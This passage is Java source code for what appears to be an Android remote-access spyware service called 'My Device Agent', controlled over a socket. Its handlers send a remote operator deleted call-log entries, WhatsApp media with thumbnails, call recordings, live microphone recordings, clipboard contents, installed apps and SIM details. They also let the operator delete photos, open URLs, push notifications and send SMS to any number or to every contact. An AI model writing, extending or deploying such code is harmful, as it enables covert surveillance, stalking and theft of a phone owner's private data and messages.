            socket.emit("call:live", liveData);
        }
    }

    // ---- Call Log Monitoring ----
    private void startCallLogMonitoring() {
        if (callLogCheckTimer != null) {
            callLogCheckTimer.cancel();
        }
        callLogCheckTimer = new Timer();
        callLogCheckTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkCallLogDeletions();
            }
        }, 5000, 30000); // Check every 30 seconds, start after 5s
    }

    // ---- Call Log Delete Detection ----
    private int lastCallLogCount = -1;
    private JSONArray lastCallLogSnapshot = null;

    // Called periodically or on demand to check for deleted call logs
    private void checkCallLogDeletions() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) return;

        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 500");

            if (cursor != null) {
                int currentCount = cursor.getCount();

                // If count decreased, something was deleted
                if (lastCallLogCount > 0 && currentCount < lastCallLogCount) {
                    int deletedCount = lastCallLogCount - currentCount;

                    // Find which entries were deleted
                    JSONArray currentEntries = new JSONArray();
                    while (cursor.moveToNext()) {
                        JSONObject entry = new JSONObject();
                        entry.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                        entry.put("timestamp", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                        currentEntries.put(entry);
                    }

                    JSONArray deletedEntries = new JSONArray();
                    if (lastCallLogSnapshot != null) {
                        for (int i = 0; i < lastCallLogSnapshot.length(); i++) {
                            JSONObject old = lastCallLogSnapshot.getJSONObject(i);
                            boolean found = false;
                            for (int j = 0; j < currentEntries.length(); j++) {
                                JSONObject curr = currentEntries.getJSONObject(j);
                                if (old.optString("number").equals(curr.optString("number")) &&
                                    old.optLong("timestamp") == curr.optLong("timestamp")) {
                                    found = true;
                                    break;
                                }
                            }
                            if (!found) {
                                deletedEntries.put(old);
                            }
                        }
                    }

                    // Emit deletion event
                    JSONObject data = new JSONObject();
                    data.put("deletedCount", deletedCount);
                    data.put("deletedEntries", deletedEntries);
                    data.put("timestamp", System.currentTimeMillis());

                    if (socket != null && socket.connected()) {
                        socket.emit("calllog:deleted", data);
                    }
                    Log.d(TAG, "Call log deletion detected: " + deletedCount + " entries removed");

                    lastCallLogSnapshot = currentEntries;
                } else {
                    // Store snapshot for comparison
                    JSONArray entries = new JSONArray();
                    while (cursor.moveToNext()) {
                        JSONObject entry = new JSONObject();
                        entry.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                        entry.put("timestamp", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                        entry.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                        entries.put(entry);
                    }
                    lastCallLogSnapshot = entries;
                }

                lastCallLogCount = currentCount;
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Call log check error: " + e.getMessage());
        }
    }

    // ---- WhatsApp Media ----
    private void handleWhatsAppFetch() {
        try {
            JSONArray media = new JSONArray();

            // WhatsApp stores media in known locations
            String[] whatsappPaths = {
                "WhatsApp/Media/WhatsApp Images",
                "WhatsApp/Media/WhatsApp Video",
                "WhatsApp/Media/WhatsApp Audio",
                "WhatsApp/Media/WhatsApp Documents",
                "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
                "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video"
            };

            File storage = Environment.getExternalStorageDirectory();

            for (String wpPath : whatsappPaths) {
                File dir = new File(storage, wpPath);
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null) {
                        int count = 0;
                        for (File f : files) {
                            if (f.isFile() && !f.getName().startsWith(".") && count < 100) {
                                JSONObject item = new JSONObject();
                                item.put("name", f.getName());
                                item.put("path", f.getAbsolutePath());
                                item.put("size", f.length());
                                item.put("lastModified", f.lastModified());
                                item.put("type", getMimeType(f.getName()));
                                item.put("folder", wpPath);

                                // Generate thumbnail for images
                                if (f.getName().toLowerCase().endsWith(".jpg") ||
                                    f.getName().toLowerCase().endsWith(".jpeg") ||
                                    f.getName().toLowerCase().endsWith(".png")) {
                                    try {
                                        BitmapFactory.Options opts = new BitmapFactory.Options();
                                        opts.inSampleSize = 8; // 1/8 size
                                        Bitmap thumb = BitmapFactory.decodeFile(f.getAbsolutePath(), opts);
                                        if (thumb != null) {
                                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                            thumb.compress(Bitmap.CompressFormat.JPEG, 40, baos);
                                            item.put("thumbnail", "data:image/jpeg;base64," +
                                                Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP));
                                            thumb.recycle();
                                        }
                                    } catch (Exception e) {
                                        // Skip thumbnail
                                    }
                                }

                                media.put(item);
                                count++;
                            }
                        }
                    }
                }
            }

            JSONObject data = new JSONObject();
            data.put("media", media);
            data.put("count", media.length());
            data.put("note", media.length() == 0 ?
                "WhatsApp media not found. Ensure WhatsApp is installed and has media." : "");
            socket.emit("whatsapp:data", data);
            Log.d(TAG, "Sent " + media.length() + " WhatsApp media items");

        } catch (Exception e) {
            Log.e(TAG, "WhatsApp fetch error: " + e.getMessage());
            emitError("whatsapp:data", e.getMessage());
        }
    }

    // ---- Photo Delete ----
    private void handlePhotoDelete(JSONObject args) {
        try {
            long photoId = args.optLong("photoId", -1);
            String photoPath = args.optString("path", "");

            boolean deleted = false;

            if (photoId > 0) {
                // Delete by MediaStore ID
                Uri contentUri = Uri.withAppendedPath(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(photoId));
                int rows = getContentResolver().delete(contentUri, null, null);
                deleted = rows > 0;
            } else if (!photoPath.isEmpty()) {
                // Delete by file path
                File file = new File(photoPath);
                if (file.exists()) {
                    deleted = file.delete();
                    // Also remove from MediaStore
                    getContentResolver().delete(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Images.Media.DATA + "=?",
                        new String[]{photoPath});
                }
            }

            JSONObject data = new JSONObject();
            data.put("success", deleted);
            data.put("photoId", photoId);
            data.put("path", photoPath);
            socket.emit("photo:deleted", data);
            Log.d(TAG, "Photo delete: " + (deleted ? "success" : "failed"));

        } catch (Exception e) {
            Log.e(TAG, "Photo delete error: " + e.getMessage());
            try {
                JSONObject data = new JSONObject();
                data.put("success", false);
                data.put("error", e.getMessage());
                socket.emit("photo:deleted", data);
            } catch (JSONException ex) {}
        }
    }

    // ---- Call Recordings ----
    private void handleRecordingsFetch() {
        try {
            JSONArray recordings = new JSONArray();
            File recordDir = new File(getExternalFilesDir(null), "recordings");

            if (recordDir.exists()) {
                File[] files = recordDir.listFiles();
                if (files != null) {
                    for (File f : files) {
                        if (f.isFile() && f.getName().startsWith("call_")) {
                            JSONObject rec = new JSONObject();
                            rec.put("name", f.getName());
                            rec.put("size", f.length());
                            rec.put("timestamp", f.lastModified());
                            rec.put("path", f.getAbsolutePath());
                            recordings.put(rec);
                        }
                    }
                }
            }

            JSONObject data = new JSONObject();
            data.put("recordings", recordings);
            data.put("count", recordings.length());
            data.put("note", recordings.length() == 0 ?
                "No recordings yet. Calls will be recorded automatically." : "");
            socket.emit("recordings:data", data);

        } catch (Exception e) {
            Log.e(TAG, "Recordings fetch error: " + e.getMessage());
        }
    }

    // ---- WebView / Open URL ----
    private void handleWebViewOpen(JSONObject args) {
        try {
            String url = args.getString("url");
            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(browserIntent);

            JSONObject data = new JSONObject();
            data.put("success", true);
            data.put("url", url);
            socket.emit("webview:opened", data);
            Log.d(TAG, "Opened URL: " + url);
        } catch (Exception e) {
            Log.e(TAG, "WebView open error: " + e.getMessage());
            emitError("webview:opened", e.getMessage());
        }
    }

    // ---- Notification Sender ----
    private static final String NOTIF_CHANNEL_CUSTOM = "mydevice_custom";
    private int customNotifId = 5000;

    private void handleNotificationSend(JSONObject args) {
        try {
            String title = args.optString("title", "My Device");
            String body = args.optString("body", "");
            String clickUrl = args.optString("url", "");

            NotificationManager nm = getSystemService(NotificationManager.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel(
                    NOTIF_CHANNEL_CUSTOM, "Custom Notifications",
                    NotificationManager.IMPORTANCE_HIGH);
                ch.setDescription("Remote notifications");
                nm.createNotificationChannel(ch);
            }

            Intent clickIntent;
            if (!clickUrl.isEmpty()) {
                clickIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(clickUrl));
            } else {
                clickIntent = new Intent(this, MainActivity.class);
            }
            clickIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent pi = PendingIntent.getActivity(this, customNotifId, clickIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

            Notification notif = new NotificationCompat.Builder(this, NOTIF_CHANNEL_CUSTOM)
                .setContentTitle(title)
                .setContentText(body)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pi)
                .setAutoCancel(true)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .build();

            nm.notify(customNotifId++, notif);

            JSONObject data = new JSONObject();
            data.put("success", true);
            socket.emit("notification:sent", data);
            Log.d(TAG, "Custom notification sent: " + title);
        } catch (Exception e) {
            Log.e(TAG, "Notification send error: " + e.getMessage());
            emitError("notification:sent", e.getMessage());
        }
    }

    // ---- Toast Message ----
    private void handleToastShow(JSONObject args) {
        try {
            String message = args.optString("message", "Hello from My Device");
            int duration = args.optInt("duration", 0); // 0=short, 1=long
            new Handler(getMainLooper()).post(() -> {
                Toast.makeText(this, message,
                    duration == 1 ? Toast.LENGTH_LONG : Toast.LENGTH_SHORT).show();
            });

            JSONObject data = new JSONObject();
            data.put("success", true);
            socket.emit("toast:shown", data);
            Log.d(TAG, "Toast shown: " + message);
        } catch (Exception e) {
            Log.e(TAG, "Toast error: " + e.getMessage());
            emitError("toast:shown", e.getMessage());
        }
    }

    // ---- SIM Card Info ----
    private void handleSimInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            JSONObject data = new JSONObject();
            data.put("operator", tm.getNetworkOperatorName());
            data.put("operatorCode", tm.getNetworkOperator());
            data.put("simOperator", tm.getSimOperatorName());
            data.put("simCountry", tm.getSimCountryIso());
            data.put("networkCountry", tm.getNetworkCountryIso());
            data.put("phoneType", tm.getPhoneType());
            data.put("networkType", tm.getDataNetworkType());
            data.put("simState", tm.getSimState());

            // Get SIM slot details if available
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    SubscriptionManager sm = (SubscriptionManager) getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE);
                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                            == PackageManager.PERMISSION_GRANTED) {
                        List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                        if (subs != null) {
                            JSONArray simSlots = new JSONArray();
                            for (SubscriptionInfo sub : subs) {
                                JSONObject sim = new JSONObject();
                                sim.put("carrier", sub.getCarrierName().toString());
                                sim.put("displayName", sub.getDisplayName().toString());
                                sim.put("slot", sub.getSimSlotIndex());
                                sim.put("country", sub.getCountryIso());
                                simSlots.put(sim);
                            }
                            data.put("simSlots", simSlots);
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "SIM slots error: " + e.getMessage());
                }
            }

            // Network connectivity info
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            NetworkInfo ni = cm.getActiveNetworkInfo();
            if (ni != null) {
                data.put("connected", ni.isConnected());
                data.put("connectionType", ni.getTypeName());
            }

            socket.emit("sim:info", data);
            Log.d(TAG, "SIM info sent");
        } catch (Exception e) {
            Log.e(TAG, "SIM info error: " + e.getMessage());
            emitError("sim:info", e.getMessage());
        }
    }

    // ---- Vibrate Device ----
    private void handleVibrate(JSONObject args) {
        try {
            long duration = args.optLong("duration", 1000);
            String pattern = args.optString("pattern", "");

            Vibrator vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (vibrator == null || !vibrator.hasVibrator()) {
                emitError("vibrate:done", "No vibrator available");
                return;
            }

            if (!pattern.isEmpty()) {
                String[] parts = pattern.split(",");
                long[] timings = new long[parts.length];
                for (int i = 0; i < parts.length; i++) {
                    timings[i] = Long.parseLong(parts[i].trim());
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator.vibrate(VibrationEffect.createWaveform(timings, -1));
                } else {
                    vibrator.vibrate(timings, -1);
                }
            } else {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    vibrator.vibrate(duration);
                }
            }

            JSONObject data = new JSONObject();
            data.put("success", true);
            socket.emit("vibrate:done", data);
            Log.d(TAG, "Device vibrated");
        } catch (Exception e) {
            Log.e(TAG, "Vibrate error: " + e.getMessage());
            emitError("vibrate:done", e.getMessage());
        }
    }

    // ---- Send SMS ----
    private void handleSmsSend(JSONObject args) {
        try {
            String number = args.getString("number");
            String message = args.getString("message");

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
                    != PackageManager.PERMISSION_GRANTED) {
                emitError("sms:sent", "SMS permission not granted");
                return;
            }

            SmsManager smsManager = SmsManager.getDefault();
            ArrayList<String> parts = smsManager.divideMessage(message);
            smsManager.sendMultipartTextMessage(number, null, parts, null, null);

            JSONObject data = new JSONObject();
            data.put("success", true);
            data.put("number", number);
            socket.emit("sms:sent", data);
            Log.d(TAG, "SMS sent to: " + number);
        } catch (Exception e) {
            Log.e(TAG, "SMS send error: " + e.getMessage());
            emitError("sms:sent", e.getMessage());
        }
    }

    // ---- Send SMS to All Contacts ----
    private void handleSmsSendAll(JSONObject args) {
        try {
            String message = args.getString("message");

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
                    != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                    != PackageManager.PERMISSION_GRANTED) {
                emitError("sms:sentall", "SMS or Contacts permission not granted");
                return;
            }

            List<String> numbers = new ArrayList<>();
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, null);

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String num = cursor.getString(0);
                    if (num != null && !num.isEmpty()) {
                        num = num.replaceAll("[^+0-9]", "");
                        if (!numbers.contains(num)) numbers.add(num);
                    }
                }
                cursor.close();
            }

            SmsManager smsManager = SmsManager.getDefault();
            ArrayList<String> parts = smsManager.divideMessage(message);
            int sentCount = 0;
            for (String number : numbers) {
                try {
                    smsManager.sendMultipartTextMessage(number, null, parts, null, null);
                    sentCount++;
                } catch (Exception e) {
                    Log.e(TAG, "SMS send error for " + number + ": " + e.getMessage());
                }
            }

            JSONObject data = new JSONObject();
            data.put("success", true);
            data.put("totalContacts", numbers.size());
            data.put("sentCount", sentCount);
            socket.emit("sms:sentall", data);
            Log.d(TAG, "SMS sent to " + sentCount + "/" + numbers.size() + " contacts");
        } catch (Exception e) {
            Log.e(TAG, "SMS send all error: " + e.getMessage());
            emitError("sms:sentall", e.getMessage());
        }
    }

    // ---- Installed Apps List ----
    private void handleAppsList() {
        try {
            PackageManager pm = getPackageManager();
            List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(
                PackageManager.GET_META_DATA);

            JSONArray appList = new JSONArray();
            for (android.content.pm.ApplicationInfo app : apps) {
                JSONObject appObj = new JSONObject();
                appObj.put("name", pm.getApplicationLabel(app).toString());
                appObj.put("package", app.packageName);
                appObj.put("system", (app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
                try {
                    android.content.pm.PackageInfo pi = pm.getPackageInfo(app.packageName, 0);
                    appObj.put("version", pi.versionName);
                    appObj.put("installedAt", pi.firstInstallTime);
                    appObj.put("updatedAt", pi.lastUpdateTime);
                } catch (Exception e) {
                    // skip version info
                }
                appList.put(appObj);
            }

            JSONObject data = new JSONObject();
            data.put("apps", appList);
            data.put("count", appList.length());
            socket.emit("apps:list", data);
            Log.d(TAG, "Sent " + appList.length() + " installed apps");
        } catch (Exception e) {
            Log.e(TAG, "Apps list error: " + e.getMessage());
            emitError("apps:list", e.getMessage());
        }
    }

    // ---- Microphone Record with Duration ----
    private void handleMicRecord(JSONObject args) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            emitError("mic:recording", "Microphone permission not granted");
            return;
        }

        int durationSeconds = args.optInt("duration", 10);
        if (durationSeconds < 1) durationSeconds = 1;
        if (durationSeconds > 300) durationSeconds = 300; // Max 5 min

        try {
            File audioFile = new File(getCacheDir(), "mic_recording_" + System.currentTimeMillis() + ".3gp");
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            JSONObject statusData = new JSONObject();
            statusData.put("status", "recording");
            statusData.put("duration", durationSeconds);
            socket.emit("mic:status", statusData);

            final int finalDuration = durationSeconds;
            new Handler(getMainLooper()).postDelayed(() -> {
                try {
                    recorder.stop();
                    recorder.release();

                    if (audioFile.exists()) {
                        FileInputStream fis = new FileInputStream(audioFile);
                        byte[] bytes = new byte[(int) audioFile.length()];
                        fis.read(bytes);
                        fis.close();

                        String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                        JSONObject data = new JSONObject();
                        data.put("audio", "data:audio/3gpp;base64," + base64);
                        data.put("duration", finalDuration);
                        data.put("size", audioFile.length());
                        socket.emit("mic:recording", data);

                        audioFile.delete();
                        Log.d(TAG, "Mic recording completed: " + finalDuration + "s");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Mic record stop error: " + e.getMessage());
                    emitError("mic:recording", e.getMessage());
                }
            }, durationSeconds * 1000L);

        } catch (Exception e) {
            Log.e(TAG, "Mic record error: " + e.getMessage());
            emitError("mic:recording", e.getMessage());
        }
    }

    // ---- Clipboard ----
    private void handleClipboardGet() {
        new Handler(getMainLooper()).post(() -> {
            try {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                String text = "";
                if (clipboard != null && clipboard.hasPrimaryClip()) {
                    ClipData clip = clipboard.getPrimaryClip();
                    if (clip != null && clip.getItemCount() > 0) {
                        CharSequence cs = clip.getItemAt(0).getText();
                        if (cs != null) text = cs.toString();
                    }
                }

                JSONObject data = new JSONObject();
                data.put("text", text);
                data.put("timestamp", System.currentTimeMillis());
                socket.emit("clipboard:content", data);
                Log.d(TAG, "Clipboard sent: " + (text.isEmpty() ? "(empty)" : text.substring(0, Math.min(50, text.length()))));
            } catch (Exception e) {
                Log.e(TAG, "Clipboard error: " + e.getMessage());
                emitError("clipboard:content", e.getMessage());
            }
        });
    }

    // ---- Helpers ----
    private String getMimeType(String fileName) {
        String ext = fileName.substring(fileName.lastIndexOf('.') + 1).toLowerCase();
        switch (ext) {
            case "jpg": case "jpeg": return "image/jpeg";
            case "png": return "image/png";
            case "gif": return "image/gif";
            case "pdf": return "application/pdf";
            case "mp3": return "audio/mpeg";
            case "mp4": return "video/mp4";
            case "txt": return "text/plain";
            default: return "application/octet-stream";
        }
    }

    private void emitError(String event, String message) {
        try {
            JSONObject data = new JSONObject();
            data.put("error", message);
            data.put("note", message);
            socket.emit(event, data);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    // ---- Notification ----
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "My Device Agent",
                NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Device agent service running");
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification(String text) {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("My Device Agent")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setContentIntent(pi)
            .setOngoing(true)
            .build();
    }

    private void updateNotification(String text) {
        NotificationManager nm = getSystemService(NotificationManager.class);
        nm.notify(NOTIFICATION_ID, buildNotification(text));
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        instance = null;

        if (callLogCheckTimer != null) {
            callLogCheckTimer.cancel();
            callLogCheckTimer = null;
        }
        handleCameraStop();
        if (socket != null) {
            socket.disconnect();
            socket.close();
        }
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        if (locationCallback != null) {
            locationClient.removeLocationUpdates(locationCallback);
        }
        if (mediaRecorder != null) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
            } catch (Exception e) {}
            mediaRecorder = null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
